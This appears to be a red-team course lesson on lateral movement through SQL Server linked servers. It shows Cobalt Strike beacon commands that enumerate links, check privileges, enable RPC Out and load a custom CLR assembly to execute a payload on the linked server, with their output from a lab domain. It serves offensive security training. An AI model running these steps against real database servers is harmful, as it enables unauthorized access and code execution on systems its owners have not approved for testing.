
SQL server links can be used to connect a SQL instance with additional data sources, including other SQL servers.  It's possible to enumerate the links that a server has with other SQL instances, and even exploit them for lateral movement.

The `sql-links` BOF will show any links that the target server has.

```powershell
beacon> sql-links lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Enumerating linked servers on lon-db-1

name | product | provider | data_source | 
------------------------------------------
LON-DB-2 | SQL Server | SQLNCLI | LON-DB-2 | 

[*] Disconnecting from server
```

This shows that _lon-db-1_ has a link with another SQL server called _lon-db-2_.  We can use this to query the linked server, e.g. using `sql-query`.

```powershell
beacon> sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Executing custom query on lon-db-2 via lon-db-1

 | 
---
lon-db-2 | 

[*] Disconnecting from server
```

Each one of these SQL BOFs has a `linkedserver` option for them to work across a link.

```powershell
beacon> sql-whoami lon-db-1 "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Determining user permissions on lon-db-2 via lon-db-1
[*] Logged in as CONTOSO\rsteel
[*] Mapped to the user dbo
[*] Gathering roles...
 |--> User is a member of the public role
 |--> User is a member of the db_owner role
 |--> User is a member of the db_accessadmin role
 |--> User is a member of the db_securityadmin role
 |--> User is a member of the db_ddladmin role
 |--> User is a member of the db_backupoperator role
 |--> User is a member of the db_datareader role
 |--> User is a member of the db_datawriter role
 |--> User is NOT a member of the db_denydatareader role
 |--> User is NOT a member of the db_denydatawriter role
 |--> User is a member of the sysadmin role
 |--> User is a member of the setupadmin role
 |--> User is a member of the serveradmin role
 |--> User is a member of the securityadmin role
 |--> User is a member of the processadmin role
 |--> User is a member of the diskadmin role
 |--> User is a member of the dbcreator role
 |--> User is a member of the bulkadmin role

[*] Disconnecting from server
```

The security context that you receive on the linked server depends on how the link itself is configured.  It may use hardcoded local credentials, hardcoded domain credentials, or it may inherit the security context of the current session.  For example, if the link was configured using the local sa account, then you will have access to the linked server as the sa user.  That will give you sysadmin privileges on the linked server, even if you don't have that access on the initial server.

If xp_cmdshell, OLE, or CLR are already enabled on the linked server then we can attack it as previously described.  If not, then we obviously have to try and enable them.  However, this will fail if _RPC Out_ is not enabled on the link, as it's required in order to call stored procedures on the linked server.

The `sql-checkrpc` command can be used to check first, and `sql-enablerpc` to enable it on a target link.

```powershell
beacon> sql-checkrpc lon-db-1

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Enumerating RPC status of linked servers on lon-db-1

name | is_rpc_out_enabled | 
----------------------------
lon-db-1 | 1 | 
LON-DB-2 | 0 | 

[*] Disconnecting from server

beacon> sql-enablerpc lon-db-1 lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Toggling RPC on lon-db-2...

is_rpc_out_enabled | 
---------------------
1 | 

[*] Disconnecting from server
```

We can then get code execution across the link, e.g. with `sql-clr`.

```powershell
beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-db-2

[*] Connecting to lon-db-1:1433
[+] Successfully connected to database
[*] Performing CLR custom assembly attack on lon-db-2 via lon-db-1

[*] CLR is enabled
[*] RPC out is enabled
[!] Error fetching results
[*] Assembly hash does not exist (error fetching result normal)
[*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name "ztvnsjhj"
[*] Creating a new custom assembly with the name "ioivboaj"
[*] Loading DLL into stored procedure "MyProcedure"
[*] Created "[ioivboaj].[StoredProcedures].[MyProcedure]"
[*] Executing payload...
[*] Cleaning up...

[*] Disconnecting from server
```

![[Pasted image 20250723093842.png]]
